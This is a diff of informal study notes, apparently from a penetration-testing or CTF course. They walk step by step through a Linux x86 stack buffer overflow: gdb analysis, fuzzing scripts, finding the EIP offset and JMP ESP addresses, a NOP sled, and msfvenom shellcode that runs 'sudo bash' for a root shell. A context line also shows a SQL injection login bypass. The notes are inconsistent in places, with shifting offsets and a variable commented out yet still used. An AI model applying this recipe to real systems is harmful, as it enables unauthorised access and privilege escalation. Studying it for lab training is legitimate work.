@@ -87,9 +87,205 @@ http://ip/login.php?**username='OR 1='1&passwd='OR 1='1**
 
 ex: **./exploit_me $(whoami)**
 
-- ( you know that it is a script that is a potential exploit on a machine so you will do the linuxexploitation on script)
+- ( you know that it is a script that is a potential exploit on a machine so you will do exploit development on script)
+
+- (go to linops to make linbuf script)
+
+gdb ./(file)
+
+(maintain gdb session)
+
+shell and can type exit and go back to it
+
+(want to investigate funcitons)
+
+file ; (to see if file is uploaded)
+
+file ./(file ; (to upload file)
+
+info functions ; (to view functions)
+
+(note: the functions with _ are computer default, focus on the ones that don't have it)
+
+Disassembly
+
+run disass_main or pdisass main
+
+(note: what we will be paying attention to is the call to user input, not x86, ect.)
+
+(green is basic, and red colored is more vulnerable)
+
+(to go more into the function)
+
+pdisass getuserinput
+
+(if you were asked what was the vulnerable function in the file and your answer would be one of the red functions, just the name, not the symbol)
+
+Dynamic Analysis Pt II
+
+Fuzzing ; (were going to throw things at the program to see when it breaks)
+
+- (find offset, defile variable offset and set variable as A)
+
+- (to fuzz, create .py script with the offset value, cout into ./(file)
+
+(in the file)
+
+#!/usr/bin/python
+
+offset = "A" * 100
+
+print(offset)
+
+(cout into file)
+
+./func $(python linbuf.py)
+
+- (build off, pinpoint or find EIP, using wiremask) (run script in gdb)
+
+**run  $(python linbuf.py)**
+
+(turn off offset and then user wiremask string)
+(in file)
+
+offset = "wiremask val"
+
+print(offset)
+
+- ( rerun in gdb)
+
+**run $(python linbuf.py)**
+
+- ( look at EIP = register value ---> enter value into wiremask register value ---> get value)
+
+- ( after getting real offset value, edit .py script and input real offset found, and creat a value for EIP) 
+
+(in script file)
+
+offset = "A" * 62
+
+eip = "BBB"
+
+print(offset + eip) ; (this points to the next instruction)
+
+- (see if the BBB show in the hex 0x424242)
+
+- ( then you will comment out the eip)
 
 
+(in file)
+
+#!/usr/bin/python
+
+offset = "A" * 62
+
+#eip = "BBB"
+
+print(offset + eip)
+
+- (your just changing in file dont do anything else)
+
+- (find JMP ESP)
+
+**env - gdb ./func**
+
+(from gdb)
+
+**unset env LINES**
+
+**unset env COLUMNS**
+
+**start**
+
+**step** (ONLY IF YOU HAVE A MORE COMPLICATED PROGRAM)
+
+**info proc map** (might need to file ./(file) then start and info proc map again)
+
+- (looking for the HEAP and STACK) so enter step --> info proc map until you see heap or stack)
+(we need to find the JMP within the location between HEAP and STACK)
+
+- ( we are going to run a find cmd to use the address from the values outputted)
+syntax: find /b (1st addr after heap),(addr end of stack),0xff,0xe4
+
+- (run in gdb)
+
+**find /b 0xf7de1000,0xffffe000,0xff,0xe4**
+
+- (then take 1st 5 addresses and copy into notes)
+addresses from cmd:
+
+0xf7de3b59
+
+0xf7f588ab
+
+0xf7f645fb
+
+0xf7f6460f
+
+0xf7f64aeb
+
+- (then convert addr's to little endian (back to front))
+1st addr: 0xf7de3b59 ---> f7 de 3b 59 ---> "\x59\x3b\xde\xf7"
+
+- (in the .py script you will set the eip to the addr you converted into little endian)
+(in file)
+
+#!/usr/bin/python
+
+offset= "A" * 55
+
+eip = "\x59\x3b\xde\xf7" 
+
+nop = "\x90" * 15
+
+print(offset + eip + nop)
+
+- from (linops)
+
+- ( then user msfvenom )
+  
+**msfvenom -p linux/x86/exec CMD=whoami -b "\x00\xfe\x20\x0a\xff" -f python**
+
+(note: change the command to what you need to get your answer)
+
+- (after entering cmd, you will be prompted buf += and copy the whole thing and paste into .py script)
+(in file)
+
+#!/usr/bin/python
+
+eip = "\x59\x3b\xde\xf7"
+
+nop = "\x90" * 15 
+
+buf = b""
+(paste from buf += to end) 
 
 
+print(offset + eip + nop + buf)
+
+- (now rerun the script from machine with exe **./func $(python linbuf.py)**, and prompt with an answer)
+(note: as long as you update msfvenom cmd and change buf in .py script you can run any cmd)
+
+ex:
+
+**msfvenom -p linux/x86/exec CMD="sudo bash" -b "\x00\xfe\x20\x0a\xff" -f python**
+
+(then you just copy the buf back into script and rerun the py script)
+
+
+- ( go back to the machine your running exe in)
+
+(note that the exe you have sudo perms on)
+
+** sudo ./exploit_me $(python linbuf.py)**
+
+- (then it will prompt you a terminal that you opened via exe and enumerate the machine)
+
+(note once you get into machine, change password and then ssh into it by making another MS)
+
+- (then start enumerating the machine)
+
+**cat /etc/hosts**
+
+**
 
